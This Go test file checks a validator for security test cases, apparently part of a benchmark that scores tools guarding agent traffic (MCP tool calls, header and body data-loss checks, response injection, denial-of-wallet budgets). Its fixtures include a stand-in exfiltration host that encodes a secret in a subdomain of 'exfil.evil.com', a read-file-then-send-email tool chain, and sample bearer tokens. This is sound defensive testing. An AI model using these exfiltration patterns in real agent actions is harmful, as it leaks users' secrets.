	assertContainsError(t, validatePayload("mcp_initialize_response", wrongMethod), "initialize request, not tools/list")

	malformedResult := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize"},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{}, "instructions": "Use the catalog.", "tools": []interface{}{}}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", malformedResult), "must not contain a tools/list inventory")

	mismatchedID := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize"},
		map[string]interface{}{"jsonrpc": "2.0", "id": 2, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{}, "instructions": "Use the catalog."}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", mismatchedID), "request and result IDs must match")

	missingIDs := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client", "version": "1.0.0"}}},
		map[string]interface{}{"jsonrpc": "2.0", "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server", "version": "1.0.0"}, "instructions": "Use the catalog."}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", missingIDs), "require supported non-empty IDs")

	missingParams := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize"},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server", "version": "1.0.0"}, "instructions": "Use the catalog."}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", missingParams), "initialize request requires params")

	missingServerInfoName := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client", "version": "1.0.0"}}},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"version": "1.0.0"}, "instructions": "Use the catalog."}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", missingServerInfoName), "result serverInfo requires name")

	missingServerInfoVersion := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client", "version": "1.0.0"}}},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server"}, "instructions": "Use the catalog."}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", missingServerInfoVersion), "result serverInfo requires version")

	missingClientInfoVersion := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client"}}},
		map[string]interface{}{"jsonrpc": "2.0", "id": 1, "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server", "version": "1.0.0"}, "instructions": "Use the catalog."}},
	}}
	assertContainsError(t, validatePayload("mcp_initialize_response", missingClientInfoVersion), "request params clientInfo requires version")
}

func TestMCPInitializeResponsePayloadPreservesLargeNumericIDs(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-tool", "mcp-large-id-001.json", `{
		"schema_version": 4, "id": "mcp-large-id-001", "category": "mcp_tool",
		"title": "T", "description": "D", "input_type": "mcp_initialize_response",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [
			{"jsonrpc": "2.0", "id": 9007199254740992, "method": "initialize", "params": {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "test-client", "version": "1.0.0"}}},
			{"jsonrpc": "2.0", "id": 9007199254740993, "result": {"protocolVersion": "2025-06-18", "capabilities": {}, "serverInfo": {"name": "test-server", "version": "1.0.0"}}}
		]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_tool_poison"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	path := filepath.Join(dir, "mcp-tool", "mcp-large-id-001.json")
	assertContainsError(t, validateFile(path, make(map[string]string)), "request and result IDs must match")
}

func TestMCPInitializeResponsePayloadNormalizesEquivalentNumericIDs(t *testing.T) {
	payload := map[string]interface{}{"jsonrpc_messages": []interface{}{
		map[string]interface{}{"jsonrpc": "2.0", "id": json.Number("1"), "method": "initialize", "params": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "clientInfo": map[string]interface{}{"name": "test-client", "version": "1.0.0"}}},
		map[string]interface{}{"jsonrpc": "2.0", "id": json.Number("1.0"), "result": map[string]interface{}{"protocolVersion": "2025-06-18", "capabilities": map[string]interface{}{}, "serverInfo": map[string]interface{}{"name": "test-server", "version": "1.0.0"}}},
	}}
	if errors := validatePayload("mcp_initialize_response", payload); len(errors) != 0 {
		t.Fatalf("equivalent numeric initialize IDs errors = %v, want acceptance", errors)
	}

	payload["jsonrpc_messages"].([]interface{})[1].(map[string]interface{})["id"] = json.Number("1.5")
	assertContainsError(t, validatePayload("mcp_initialize_response", payload), "request and result IDs must match")
}

func TestPositiveIntChecksNativeIntBounds(t *testing.T) {
	value, ok := positiveInt(int64(^uint(0) >> 1))
	if !ok || value <= 0 {
		t.Fatalf("native max int = (%d, %t), want positive accepted value", value, ok)
	}
	if strconv.IntSize == 32 {
		if _, ok := positiveInt(int64(1) << 31); ok {
			t.Fatal("value above 32-bit int range accepted")
		}
	}
}

func TestMCPChainPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-chain", "mcp-chain-valid-001.json", `{
		"schema_version": 4, "id": "mcp-chain-valid-001", "category": "mcp_chain",
		"title": "T", "description": "D", "input_type": "mcp_tool_sequence",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [
			{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "read_file"}, "id": 1},
			{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "send_email"}, "id": 2}
		]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_chain"], "requires": ["mcp_chain_memory"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-chain", "mcp-chain-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for mcp_chain, got: %v", errors)
	}
}

func TestBudgetPayloadCallCountValid(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-chain", "mcp-chain-dow-valid-001.json", `{
		"schema_version": 4, "id": "mcp-chain-dow-valid-001", "category": "mcp_chain",
		"title": "T", "description": "D", "input_type": "mcp_tool_sequence",
		"transport": "mcp_stdio",
		"payload": {
			"budget_scope": "per_subject",
			"subject_id": "project-alpha",
			"budget_limit_calls": 3,
			"over_budget_call_id": 4,
			"jsonrpc_messages": [
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 1},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 2},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 3},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 4}
			]
		},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_chain", "denial_of_wallet"], "requires": ["mcp_chain_memory"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": "synthetic: test"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-chain", "mcp-chain-dow-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for call-count budget case, got: %v", errors)
	}
}

func TestBudgetPayloadRejectsWeightedUnits(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-chain", "mcp-chain-dow-weighted-001.json", `{
		"schema_version": 4, "id": "mcp-chain-dow-weighted-001", "category": "mcp_chain",
		"title": "T", "description": "D", "input_type": "mcp_tool_sequence",
		"transport": "mcp_stdio",
		"payload": {
			"budget_scope": "per_subject",
			"subject_id": "project-alpha",
			"budget_limit_units": 100,
			"budget_limit_calls": 3,
			"over_budget_call_id": 4,
			"jsonrpc_messages": [
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha", "cost_units": 35}}, "id": 1},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 2},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 3},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 4}
			]
		},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_chain", "denial_of_wallet"], "requires": ["mcp_chain_memory"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": "synthetic: test"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-chain", "mcp-chain-dow-weighted-001.json")
	errors := validateFile(path, ids)
	if len(errors) < 2 {
		t.Fatalf("expected weighted budget errors, got: %v", errors)
	}
}

func TestResponseMITMValidPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "response-mitm", "response-mitm-valid-001.json", `{
		"schema_version": 4, "id": "response-mitm-valid-001", "category": "response_mitm",
		"title": "T", "description": "D", "input_type": "response_content",
		"transport": "http_proxy",
		"payload": {"url": "https://example.com", "response_body": "<html>injected</html>"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning", "tls_interception"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "response-mitm", "response-mitm-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for response_mitm, got: %v", errors)
	}
}

func TestRequestBodyValidPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "request-body", "request-body-valid-001.json", `{
		"schema_version": 4, "id": "request-body-valid-001", "category": "request_body",
		"title": "T", "description": "D", "input_type": "request_body",
		"transport": "http_proxy",
		"payload": {"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "{\"key\": \"secret\"}"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["request_body_dlp"], "requires": ["request_body_dlp_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "request-body", "request-body-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for request_body, got: %v", errors)
	}
}

func TestCryptoFinancialCreditCardRequestBodyContract(t *testing.T) {
	path := filepath.Join("..", "cases", "crypto-financial", "crypto-credit-card-006.json")
	raw, err := os.ReadFile(path)
	if os.IsNotExist(err) {
		t.Skip("crypto financial corpus case not found (running outside repo)")
	}
	if err != nil {
		t.Fatal(err)
	}

	var c Case
	if err := json.Unmarshal(raw, &c); err != nil {
		t.Fatalf("unmarshal case: %v", err)
	}
	if c.SchemaVersion != 4 {
		t.Fatalf("schema_version = %d, want 4", c.SchemaVersion)
	}
	if len(c.Requires) != 1 || c.Requires[0] != "crypto_dlp_scanning" {
		t.Fatalf("requires = %v, want [crypto_dlp_scanning]", c.Requires)
	}
	if c.Category != "crypto_financial" || c.InputType != "request_body" || c.Transport != "http_proxy" {
		t.Fatalf("case route = %s/%s/%s, want crypto_financial/request_body/http_proxy", c.Category, c.InputType, c.Transport)
	}

	ids := make(map[string]string)
	if errors := validateFile(path, ids); len(errors) > 0 {
		t.Errorf("expected no errors for crypto financial credit-card request body case, got: %v", errors)
	}
}

func TestCryptoFinancialHTTPProxyHeaderContract(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "crypto-financial", "crypto-header-valid-001.json", `{
		"schema_version": 4, "id": "crypto-header-valid-001", "category": "crypto_financial",
		"title": "T", "description": "D", "input_type": "header",
		"transport": "http_proxy",
		"payload": {"method": "GET", "url": "https://example.com", "headers": {"X-Wallet": "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"}},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["crypto_dlp"], "requires": ["crypto_dlp_scanning"],
		"false_positive_risk": "medium", "why_expected": "test",
		"notes": "", "source": "synthetic: crypto header"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "crypto-financial", "crypto-header-valid-001.json")
	if errors := validateFile(path, ids); len(errors) > 0 {
		t.Errorf("expected no errors for crypto financial header http_proxy case, got: %v", errors)
	}
}

func TestCryptoFinancialHTTPProxyRejectsURLInput(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "crypto-financial", "crypto-url-http-proxy-invalid-001.json", `{
		"schema_version": 4, "id": "crypto-url-http-proxy-invalid-001", "category": "crypto_financial",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "http_proxy",
		"payload": {"method": "GET", "url": "https://example.com/?wallet=bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["crypto_dlp"], "requires": ["crypto_dlp_scanning"],
		"false_positive_risk": "medium", "why_expected": "test",
		"notes": "", "source": "synthetic: crypto url"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "crypto-financial", "crypto-url-http-proxy-invalid-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `category "crypto_financial" allows http_proxy only for request_body or header input_type`)
}

func TestHeaderValidPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "headers", "headers-valid-001.json", `{
		"schema_version": 4, "id": "headers-valid-001", "category": "headers",
		"title": "T", "description": "D", "input_type": "header",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com", "headers": {"Authorization": "Bearer secret123"}},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["header_dlp"], "requires": ["header_dlp_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "headers", "headers-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for header payload, got: %v", errors)
	}
}

func TestMCPJsonrpcElementMustBeObject(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-input", "mcp-notobj-001.json", `{
		"schema_version": 4, "id": "mcp-notobj-001", "category": "mcp_input",
		"title": "T", "description": "D", "input_type": "mcp_tool_call",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [42]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_input_scan"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-input", "mcp-notobj-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "must be an object")
}

func TestMCPJsonrpcElementMissingVersion(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-input", "mcp-noversion-001.json", `{
		"schema_version": 4, "id": "mcp-noversion-001", "category": "mcp_input",
		"title": "T", "description": "D", "input_type": "mcp_tool_call",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [{"method": "tools/call", "params": {}, "id": 1}]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_input_scan"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-input", "mcp-noversion-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `missing required field "jsonrpc"`)
}

func TestMCPJsonrpcMessagesNotArray(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-input", "mcp-notarray-001.json", `{
		"schema_version": 4, "id": "mcp-notarray-001", "category": "mcp_input",
		"title": "T", "description": "D", "input_type": "mcp_tool_call",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": "not an array"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_input_scan"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-input", "mcp-notarray-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "payload.jsonrpc_messages must be an array")
}

func TestAllCategoryTransportCombinations(t *testing.T) {
	// Verify every valid category+transport combo passes
	combos := map[string]struct {
		inputType string
		transport string
		payload   string
	}{
		"url+fetch_proxy":                   {"url", "fetch_proxy", `{"method": "GET", "url": "https://example.com"}`},
		"url+http_proxy":                    {"url", "http_proxy", `{"method": "GET", "url": "https://example.com"}`},
		"url+websocket":                     {"url", "websocket", `{"method": "GET", "url": "https://example.com"}`},
		"request_body+fetch_proxy":          {"request_body", "fetch_proxy", `{"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "data"}`},
		"request_body+http_proxy":           {"request_body", "http_proxy", `{"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "data"}`},
		"headers+fetch_proxy":               {"header", "fetch_proxy", `{"method": "GET", "url": "https://example.com", "headers": {"X-Key": "val"}}`},
		"response_fetch+fetch_proxy":        {"response_content", "fetch_proxy", `{"url": "https://example.com", "response_body": "hello"}`},
		"response_mitm+http_proxy":          {"response_content", "http_proxy", `{"url": "https://example.com", "response_body": "hello"}`},
		"mcp_input+mcp_stdio":               {"mcp_tool_call", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
		"mcp_input+mcp_http":                {"mcp_tool_call", "mcp_http", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
		"mcp_tool+mcp_stdio":                {"mcp_tool_result", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {}, "id": 1}]}`},
		"mcp_chain+mcp_stdio":               {"mcp_tool_sequence", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
		"hostname_exfiltration+fetch_proxy": {"url", "fetch_proxy", `{"method": "GET", "url": "https://7365637265743132.exfil.evil.com/"}`},
		"hostname_exfiltration+http_proxy":  {"url", "http_proxy", `{"method": "GET", "url": "https://7365637265743132.exfil.evil.com/"}`},
	}

	for name, combo := range combos {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			// Extract category from name
			category := name[:strings.Index(name, "+")]
			subdir := categoryDir(category)
			id := strings.ReplaceAll(name, "+", "-")
			fname := id + ".json"
			caseJSON := fmt.Sprintf(`{
				"schema_version": 4, "id": %q, "category": %q,
				"title": "T", "description": "D", "input_type": %q,
				"transport": %q,
				"payload": %s,
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": "original"
			}`, id, category, combo.inputType, combo.transport, combo.payload)
			writeCase(t, dir, subdir, fname, caseJSON)
			ids := make(map[string]string)
			path := filepath.Join(dir, subdir, fname)
			errors := validateFile(path, ids)
			if len(errors) > 0 {
				t.Errorf("expected valid combo %s, got errors: %v", name, errors)
			}
		})
	}
}

func TestSafeExampleFalseOnBenignCase(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-safeFalse-001.json", `{
		"schema_version": 4, "id": "url-safeFalse-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "allow", "severity": "low",
		"capability_tags": ["benign"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"safe_example": false,
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-safeFalse-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "safe_example")
}

func TestMultipleValidationErrors(t *testing.T) {
	// A case with many issues should report all of them
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-multi-001.json", `{
		"schema_version": 0,
		"id": "url-multi-001", "category": "invalid_cat",
		"title": "", "description": "", "input_type": "bad_type",
		"transport": "carrier_pigeon",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "maybe", "severity": "ultra",
		"capability_tags": [], "requires": [],
		"false_positive_risk": "extreme", "why_expected": "",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-multi-001.json")
	errors := validateFile(path, ids)

	// Should have at least 8 errors: schema_version, title, description, why_expected,
	// category, input_type, transport, verdict, severity, fp_risk, capability_tags
	if len(errors) < 8 {
		t.Errorf("expected at least 8 errors, got %d: %v", len(errors), errors)
	}
}

func TestResponseContentPayloadMissingResponseBody(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "response-fetch", "response-fetch-nobody-001.json", `{
		"schema_version": 4, "id": "response-fetch-nobody-001", "category": "response_fetch",
		"title": "T", "description": "D", "input_type": "response_content",
		"transport": "fetch_proxy",
		"payload": {"url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "response-fetch", "response-fetch-nobody-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `payload missing required key "response_body"`)
}

func TestResponseContentPayloadMissingURL(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "response-fetch", "response-fetch-nourl-001.json", `{
		"schema_version": 4, "id": "response-fetch-nourl-001", "category": "response_fetch",
		"title": "T", "description": "D", "input_type": "response_content",
		"transport": "fetch_proxy",
		"payload": {"response_body": "test"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "response-fetch", "response-fetch-nourl-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `payload missing required key "url"`)
}

func TestRequestBodyPayloadMissingContentType(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "request-body", "request-body-noct-001.json", `{
		"schema_version": 4, "id": "request-body-noct-001", "category": "request_body",
		"title": "T", "description": "D", "input_type": "request_body",
		"transport": "fetch_proxy",
		"payload": {"method": "POST", "url": "https://example.com", "body": "data"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["request_body_dlp"], "requires": ["request_body_dlp_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "request-body", "request-body-noct-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `payload missing required key "content_type"`)
}

func TestCLIExitCodeOnFailure(t *testing.T) {
	binPath := filepath.Join(t.TempDir(), "validate")
	build := exec.Command("go", "build", "-o", binPath, ".")
	build.Dir = "."
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build failed: %v\n%s", err, out)
	}

	// Run against an empty directory (no cases)
	emptyDir := t.TempDir()
	cmd := exec.Command(binPath, emptyDir)
	output, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatal("expected non-zero exit code for empty directory")
	}
	if !containsStr(string(output), "no case files found") {
		t.Errorf("expected 'no case files found' message, got: %s", output)
	}
}

func TestCLISuccessOnValidCases(t *testing.T) {
	binPath := filepath.Join(t.TempDir(), "validate")
	build := exec.Command("go", "build", "-o", binPath, ".")
	build.Dir = "."
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build failed: %v\n%s", err, out)
	}

	// Create a valid case
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-cli-001.json", `{
		"schema_version": 4, "id": "url-cli-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	cmd := exec.Command(binPath, dir)
	output, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("expected zero exit code, got error: %v\n%s", err, output)
	}
	if !containsStr(string(output), "validated 1 case") {
		t.Errorf("expected success message, got: %s", output)
	}
}

func TestAllExistingCasesValid(t *testing.T) {
	// Validate the actual corpus to make sure the validator doesn't break real cases.
	casesDir := "../cases"
	if _, err := os.Stat(casesDir); os.IsNotExist(err) {
		t.Skip("cases directory not found (running outside repo)")
	}

	ids := make(map[string]string)
	var allErrors []string

	err := filepath.Walk(casesDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		// Skip multi-file case directories — they have their own schema.
		if info.IsDir() && isMultiFileCaseDir(info.Name()) {
			return filepath.SkipDir
		}
		if info.IsDir() || filepath.Ext(info.Name()) != ".json" {
			return nil
		}
		fileErrors := validateFile(path, ids)
		allErrors = append(allErrors, fileErrors...)
		return nil
	})
	if err != nil {
		t.Fatalf("walk error: %v", err)
	}
	if len(allErrors) > 0 {
		for _, e := range allErrors {
			t.Errorf("validation error: %s", e)
		}
	}
}

// assertContainsError checks that at least one error contains the substring.
func assertContainsError(t *testing.T, errors []string, substr string) {
	t.Helper()
	if len(errors) == 0 {
		t.Fatalf("expected error containing %q, got no errors", substr)
	}
	for _, e := range errors {
		if containsStr(e, substr) {
			return
		}
	}
	t.Errorf("expected error containing %q, got: %v", substr, errors)
}

// categoryDir maps category names to directory names for test setup.
func categoryDir(category string) string {
	dirs := map[string]string{
		"url": "url", "request_body": "request-body", "headers": "headers",
		"response_fetch": "response-fetch", "response_mitm": "response-mitm",
		"mcp_input": "mcp-input", "mcp_tool": "mcp-tool", "mcp_chain": "mcp-chain",
		"hostname_exfiltration": "hostname-exfiltration",
	}
	return dirs[category]
}

func containsStr(s, substr string) bool {
	return len(s) >= len(substr) && searchStr(s, substr)
}

func searchStr(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// strPtr returns a pointer to a string value.
func strPtr(s string) *string { return &s }

// --- Result validation tests ---

func TestResultValidation_ValidLine(t *testing.T) {
	r := ResultLine{
		SchemaVersion: 4, CaseID: "test-001", Tool: "test", ToolVersion: "1.0",
		CapabilityRegistry: testRegistryReference,
		ExpectedVerdict:    "block", ActualVerdict: "block", Score: "pass",
		Evidence: map[string]interface{}{"status": float64(403)}, Notes: strPtr(""),
	}
	errors := validateResultLine(1, r)
	if len(errors) != 0 {
		t.Fatalf("expected no errors, got: %v", errors)
	}
}

func TestResultValidation_UnreachableState(t *testing.T) {
	r := ResultLine{
		SchemaVersion: 4, CaseID: "adapter-route-missing", Tool: "test", ToolVersion: "1.0",
		CapabilityRegistry: testRegistryReference,
		ExpectedVerdict:    "block", ActualVerdict: "unreachable", Score: "error",
		Evidence: map[string]interface{}{}, Notes: strPtr("unreachable by this adapter and configuration"),
	}
	if errors := validateResultLine(1, r); len(errors) != 0 {
		t.Fatalf("unreachable result should be accepted by the v3 vocabulary: %v", errors)
	}
}

func TestResultValidationRejectsPreV3Schema(t *testing.T) {
	r := ResultLine{
		SchemaVersion: 2, CaseID: "old-result", Tool: "test", ToolVersion: "1.0",
		ExpectedVerdict: "block", ActualVerdict: "block", Score: "pass",
		Evidence: map[string]interface{}{}, Notes: strPtr(""),
	}
	assertContainsError(t, validateResultLine(1, r), "schema_version must be 4, 5, or 6")
}

func TestProfileValidationRejectsPreV3Schema(t *testing.T) {
	p := Profile{SchemaVersion: 2, Tool: "test", ToolVersion: "1", RunnerVersion: "v1", Claims: []string{}, CapabilityRegistry: testRegistryReference}
	assertContainsError(t, validateProfile(p), "incompatible_schema_version: family=tool_profile accepted=[4] got=2")
}

func TestProfileFileRefusesNMinusOneSchemaBeforeLegacyFields(t *testing.T) {
	path := filepath.Join(t.TempDir(), "profile-v3.json")
	if err := os.WriteFile(path, []byte(`{"schema_version":3,"tool":"test","tool_version":"1","runner_version":"v1","claims":[],"supports":{}}`), 0o600); err != nil {
		t.Fatal(err)
	}
